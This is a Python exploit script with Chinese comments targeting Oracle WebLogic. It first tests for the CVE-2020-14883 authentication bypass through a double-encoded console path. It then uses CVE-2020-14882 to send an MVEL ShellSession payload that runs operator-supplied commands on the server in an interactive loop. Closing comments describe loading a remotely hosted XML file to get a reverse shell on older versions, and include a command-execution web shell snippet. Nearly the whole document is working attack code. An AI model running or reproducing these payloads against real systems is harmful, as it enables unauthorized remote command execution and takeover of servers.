import requests
import http.client
import sys

http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'


# CVE-2020-14883和CVE-2020-14882
# 判断是否存在CVE-2020-14883
def judge():
    try:
        test_url = url + '/console/css/%252e%252e%252fconsole.portal'
        b = sess.get(url=test_url, headers=headers)
        judge_url = sess.get(url=test_url, headers=headers)
        if judge_url.status_code == 200:
            print(url + "存在未授权访问后台")
            try:
                if input("\n是否尝试结合CVE-2020-14882达成rce (y/n)> ").lower().startswith('n'):
                    sys.exit(1)
                else:
                    get_poc(test_url)
            except:
                pass

        else:
            print("不存在")
    except:
        pass


# 利用CVE-2020-14882 针对版本在12以上
def get_poc(poc_url):
    try:
        print("尝试中。。。")
        while True:
            cmd = input("cmd:")
            poc = '_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();' \
                  ' weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork(); ' \
                  'java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter);' \
                  ' weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj); ' \
                  'String cmd = req.getHeader("cmd"); ' \
                  'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? ' \
                  'new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; ' \
                  'if (cmd != null) { String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\\A").next(); ' \
                  'weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);' \
                  'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));' \
                  'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ")'
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
                       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                       'Accept-Encoding': 'gzip, deflate',
                       'Accept-Language': 'zh-CN,zh;q=0.9',
                       'Connection': 'close',
                       'Content-Type': 'application/x-www-form-urlencoded',
                       'cmd': cmd}
            try:
                response = sess.post(url=poc_url, headers=headers, data=poc)
                print(response.text)
            except:
                print("出错。。。")
                break
    except:
        print("不能结合利用")


if __name__ == '__main__':
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'}
    url = input("url: ")
    sess = requests.session()
    judge()
# 针对版本在10可通过搭建简易的web服务器，然后让被攻击者访问反弹shell
# ?_nfpb=true&_pageLabel=HomePage1&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(服务器下的xml)
# 附上win和Linux下结合的xml
# <%@ page contentType="text/html;charset=UTF-8" language="java" %>
# <%
#     weblogic.work.WorkAdapter adapter = ((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork();
#     if(adapter.getClass().getName().endsWith("ServletRequestImpl")){
#         String cmd = (String) adapter.getClass().getMethod("getHeader", String.class).invoke(adapter, "cmd");
#         if(cmd != null && !cmd.isEmpty()){
#             String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
#             weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) adapter.getClass().getMethod("getResponse").invoke(adapter);
#             res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
#             res.getServletOutputStream().flush();
#             res.getWriter().write("");
#         }
#     }else{
#         java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
#         field.setAccessible(true);
#         Object obj = field.get(adapter);
#         obj = obj.getClass().getMethod("getServletRequest").invoke(obj);
#         String cmd = (String) obj.getClass().getMethod("getHeader", String.class).invoke(obj, "cmd");
#         if(cmd != null && !cmd.isEmpty()){
#             String result = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
#             weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) obj.getClass().getMethod("getResponse").invoke(obj);
#             res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
#             res.getServletOutputStream().flush();
#             res.getWriter().write("");
#         }
#     }
# %>